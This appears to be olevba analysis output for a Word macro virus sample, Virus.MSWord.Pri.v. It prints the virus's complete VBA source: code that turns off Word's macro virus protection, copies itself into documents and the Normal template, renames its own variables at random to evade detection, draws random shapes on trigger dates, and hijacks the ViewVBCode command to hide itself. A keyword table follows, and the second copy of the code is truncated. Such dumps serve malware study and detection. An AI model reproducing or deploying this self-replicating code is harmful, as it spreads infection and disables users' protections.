olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.v-5ad8d9c5f5310d4ce131d1e6c3d9d35775875b57
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.v-5ad8d9c5f5310d4ce131d1e6c3d9d35775875b57 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False
If Day(Now) > Minute(Now) Then
Randomize: For VR9797 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next VR9797: End If
QS5389 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HK8375 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LT891 = ActiveDocument.VBProject.VBComponents.Item(1)
PQ2142 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set LT891 = NormalTemplate.VBProject.VBComponents.Item(1)
BM2719 = True
Call OL5326_IF1454
ActiveDocument.Saved = True
End If
If BM2719 <> True And PQ2142 <> True Then GoTo TJ1823
If BM2719 = True Then LT891.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QS5389 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If PQ2142 = True Then LT891.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HK8375 - 4))
TJ1823:
If HK8375 <> 0 And QS5389 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function OL5326_IF1454()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "RV9785": r1(2) = "HI9569": r1(3) = "QO9641": r1(4) = "NF7070": r1(5) = "IF1454": r1(6) = "QS5389"
r1(7) = "HK8375": r1(8) = "PQ2142":: r1(9) = "LT891": r1(10) = "BM2719": r1(11) = "TJ1823": r1(12) = "OL5326": r1(13) = "OP877": r1(14) = "TA5541": r1(15) = "VR9797"
For VR9797 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call IF1454(a1, r1(VR9797))
Next VR9797
End Function 'VAMP v1.0 [thanks Vic!]
Private Function IF1454(TA5541, OP877 As String)
On Error Resume Next
Dim RV9785 As Long: Dim HI9569 As Long: Dim QO9641 As Long: Dim NF7070 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
RV9785 = 1: HI9569 = 1: QO9641 = .CountOfLines: NF7070 = Len(.Lines(.CountOfLines, 1))
Do While .Find(OP877, RV9785, HI9569, QO9641, NF7070, True)
strline = .Lines(RV9785, 1)
strline = Left(strline, HI9569 - 1) & TA5541 & Mid(strline, NF7070)
.replaceline RV9785, strline
RV9785 = QO9641 + 1: HI9569 = 1:
QO9641 = .CountOfLines
NF7070 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Sub Document_C()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For LP6860 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next LP6860: End If
KQ8133 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CM9031 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = ActiveDocument.VBProject.VBComponents.Item(1)
OT7120 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = NormalTemplate.VBProject.VBComponents.Item(1)
BN320 = True
Call KD5741_KM6385
ActiveDocument.Saved = True
End If
If BN320 <> True And OT7120 <> True Then GoTo VN151
If BN320 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ8133 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OT7120 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CM9031 - 4))
VN151:
If CM9031 <> 0 And KQ8133 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KD5741_KM6385()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FD8988": r1(2) = "UP8720": r1(3) = "IG4087": r1(4) = "TL7973": r1(5) = "KM6385": r1(6) = "KQ8133"
r1(7) = "CM9031": r1(8) = "OT7120":: r1(9) = "HV823": r1(10) = "BN320": r1(11) = "VN151": r1(12) = "KD5741": r1(13) = "HD853": r1(14) = "FS9162": r1(15) = "LP6860"
For LP6860 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KM6385(a1, r1(LP6860))
Next LP6860
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KM6385(FS9162, HD853 As String)
On Error Resume Next
Dim FD8988 As Long: Dim UP8720 As Long: Dim IG4087 As Long: Dim TL7973 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FD8988 = 1: UP8720 = 1: IG4087 = .CountOfLines: TL7973 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HD853, FD8988, UP8720, IG4087, TL7973, True)
strline = .Lines(FD8988, 1)
strline = Left(strline, UP8720 - 1) & FS9162 & Mid(strline, TL7973)
.replaceline FD8988, strline
FD8988 = IG4087 + 1: UP8720 = 1:
IG4087 = .CountOfLines
TL7973 = Len(.Lines(.CountOfLines, 1))
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

